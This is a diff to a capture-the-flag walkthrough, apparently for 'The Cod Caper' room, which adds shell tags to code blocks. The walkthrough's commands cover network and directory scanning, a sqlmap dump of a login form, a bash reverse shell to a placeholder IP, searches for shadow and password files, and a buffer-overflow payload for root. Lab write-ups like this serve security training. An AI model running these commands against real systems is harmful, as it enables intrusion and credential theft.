@@ -11,7 +11,7 @@ tags:
 
 Scan the network with nmap using proper techniques to get the answers.
 
-```
+```sh
 nmap -sV -A -vv -oN thecodcaper.nmap -T4 --min-rate=10000 TARGET_IP
 ```
 
@@ -34,7 +34,7 @@ Scan for the directories using Gobuster.
 
 > Note: Use the `seclists/Discovery/Web-Content/big.txt` wordlist
 
-```
+```sh
 gobuster dir -u http://TARGET_IP/ -x php,txt,html -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o thecodcaper.gobuster
 ```
 
@@ -51,7 +51,7 @@ gobuster dir -u http://TARGET_IP/ -x php,txt,html -w /usr/share/wordlists/seclis
 
 On visiting the /administrator.php page, some kind of a login form could be found. The username and password can be found using SQL injection.
 
-```
+```sh
 sqlmap --dump --forms -u http://TARGET_IP/administrator.php
 ```
 
@@ -83,19 +83,19 @@ Since we are able to run any linux command, it is better to use a reverse shell.
 
 Start a netcat listening server:
 
-```
+```sh
 nc -nlvp 4444
 ```
 
 Execute the reverse shell:
 
-```
+```sh
 bash -c 'exec bash -i &>/dev/tcp/YOUR_IP/4444 <&1'
 ```
 
 The ssh password should be saved in the `/etc/shadow` file, but you would not have superuser privileges to access its contents. But, backups stored in other places might not need sudo. Use the `find` command to search for files:
 
-```
+```sh
 find / -type f -name "shadow*"
 ```
 
@@ -107,7 +107,7 @@ Command breakdown:
 
 You'll find a backup stored in `/var/backups/shadow.bak` but its not accessible as well. So look for files containing the word "pass".
 
-```
+```sh
 find / -type f -name "pass*"
 ```
 
@@ -119,7 +119,7 @@ The ssh password should be found in the file `/var/hidden/pass`
 
 Download LinEnum on your computer from GitHub. Then use `scp` to send the file to the target machine through ssh.
 
-```
+```sh
 scp /opt/LinEnum.sh pingu@TARGET_IP/tmp
 ```
 
@@ -127,7 +127,7 @@ Login using the credentials gathered from previous task.
 
 After the command is successfully executed, login to the target with ssh and execute the LinEnum.sh script.
 
-```
+```sh
 cd /tmp && ./LinEnum.sh
 ```
 
@@ -139,7 +139,7 @@ cd /tmp && ./LinEnum.sh
 
 The previous tasks are just read-only. All you need to do is find out the root hash using binary exploitation. Run this command and you'll get the root hash:
 
-```
+```sh
 python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
 ```
 
